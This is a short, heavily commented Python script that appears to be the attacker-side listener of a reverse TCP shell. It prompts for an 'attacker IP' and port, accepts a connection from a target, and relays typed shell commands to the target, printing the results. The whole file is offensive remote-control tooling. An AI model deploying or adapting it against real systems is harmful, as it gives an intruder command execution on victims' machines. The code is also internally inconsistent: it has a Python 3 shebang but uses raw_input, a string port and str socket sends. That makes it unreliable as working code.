#! /usr/bin/python3

import socket  # We need for building TCP connection

lhost = input("What is the attacker IP?\n")
lport = input("Which port do you want to listen?\n")


def connect():
    # Starting a socket object as 's'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Defining the attacker IP and the listening port
    s.bind((lhost, lport))
    # Defining a backlog size
    # Since we are expecting a single connection from a single target
    # we will listen to one connection
    s.listen(1)
    print("[+] Listening for incoming TCP connection on port ", lport)
    # accept() function will return the connection object ID (conn)
    # and will return the client (target) IP address
    # and source port in a tuple format (IP,Port)
    conn, addr = s.accept()
    print("[+] We got a connection from: ", addr)

    while True:
        # Get user command and store it in command variable
        command = raw_input("Shell> ")

        # If we got a terminate command, inform the client and close
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break

        else:
            # Otherwise we will send the command to the target
            conn.send(command)
            # and print the result that we got back
            print(conn.recv(1024))


def main():
    connect()


main()
